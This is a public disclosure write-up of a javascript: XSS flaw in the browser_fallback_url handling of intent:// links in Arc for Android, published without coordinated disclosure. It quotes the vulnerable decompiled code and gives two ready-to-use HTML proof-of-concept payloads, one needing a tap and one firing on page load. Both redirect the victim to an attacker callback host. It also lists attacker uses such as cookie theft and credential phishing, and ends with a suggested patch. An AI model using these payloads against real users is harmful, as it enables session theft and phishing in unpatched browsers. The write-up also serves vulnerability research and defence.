# Arc for Android — `intent://` `browser_fallback_url` XSS

**tl;dr** Tap a link, tap Deny, get owned. Or don't even tap — the dialog pops up on page load by itself.

Arc for Android v1.12.7. CVSS 8.8 High. The Browser Company.

---

## What's the bug

Arc opens `intent://` links. If you tap Deny on the "Open in App" dialog, it grabs `browser_fallback_url` from the intent and shoves it into `webView.loadUrl()` without checking what scheme it is. So you can put `javascript:` there and it runs.

Three files are to blame:

```java
// n2.java — lets intent:// through because it's not http/https
if (scheme != null && !scheme.equals("https") && !scheme.equals("http")
    && C0560s.f1571a.b(scheme)) {
    x0Var.invoke(str, string2);  // → S1.java
}

// S1.java — no validation whatsoever
Intent uri = Intent.parseUri(p12, 2);
String stringExtra = uri.getStringExtra("browser_fallback_url");
if (stringExtra != null) {
    p02.f(stringExtra);   // webView.loadUrl("javascript:...")
}

// C0560s.java — any valid URI scheme passes
public static final x8.e f1571a = new x8.e("^[a-zA-Z][a-zA-Z0-9+.-]*");
```

The `S.` prefix is important — `S.browser_fallback_url=...` tells Android it's a String extra. Without it `Intent.parseUri` throws an error and nothing happens.

---

## How to run it

Then open either of these in Arc for Android:

### Tap variant (1 click + Deny)

```html
<a href="intent://xss#Intent;scheme=arctest;package=com.never.exists;S.browser_fallback_url=javascript:location='http://YOUR_IP:8080/xss_callback';end">
  click me then hit Deny
</a>
```

### Zero-click variant (no link tap — just Deny)

```html
<script>
setTimeout(function() {
  window.location = "intent://xss#Intent;scheme=arctest;package=com.never.exists;S.browser_fallback_url=javascript:location='http://YOUR_IP:8080/xss_callback?src=zeroclick';end";
}, 1500);
</script>
```

Dialog shows up by itself. Hit Deny. JS runs.

---

## The evidence

| File | What |
|---|---|
| `evidence/01_open_in_app_dialog.png` | The dialog that shouldn't be dangerous |
| `evidence/02_visual_proof_lime.png` | `lime` as plain text = JS did run |
| `evidence/03_http_callback_xss_ok.png` | Server says XSS_OK right inside Arc's WebView |
| `evidence/04_server_log.txt` | Server log showing Arc's Chrome UA hitting the callback |
| `evidence/05_poc8.html` | The PoC itself |
| `evidence/06_poc9_zeroclick_dialog.png` | Same dialog, no link tapped |
| `evidence/07_poc9_zeroclick_xssok.png` | Yep, still runs |
| `evidence/08_arc_xss_proof.mp4` | Phone + server log side-by-side, recorded live |
| `evidence/09_poc9_zeroclick.html` | The zero-click PoC |

---

## Why is this here

I tried to submit this to HackerOne. Apparently my account has a 30-day restriction or something, and by the time it lifts this thing will probably be patched. So here's the full breakdown — someone smarter than me can figure out a fix or take it from here.

---

## What an attacker can do

- Steal cookies (`document.cookie`)
- Dump the page DOM
- Phish credentials with an overlay
- Redirect to malicious sites
- Anything `javascript:` can do in a WebView

---

## The fix (if anyone from TBC is reading this)

```java
if (stringExtra != null
    && (stringExtra.startsWith("https://") || stringExtra.startsWith("http://"))) {
    p02.f(stringExtra);
}
```

Also maybe don't let every random URI scheme bypass `shouldOverrideUrlLoading` but that's your call.

---

## See also

- [Android Intent.parseUri docs](https://developer.android.com/reference/android/content/Intent#parseUri(java.lang.String,%20int))
- CVE-2014-8910 — Chrome had the same issue
- `u6/S1.java`, `u6/n2.java`, `D6/C0560s.java`

---

*Found by Yusuf Akhan (k0d3inon). Not responsible disclosure because I literally couldn't submit it. You're welcome.*
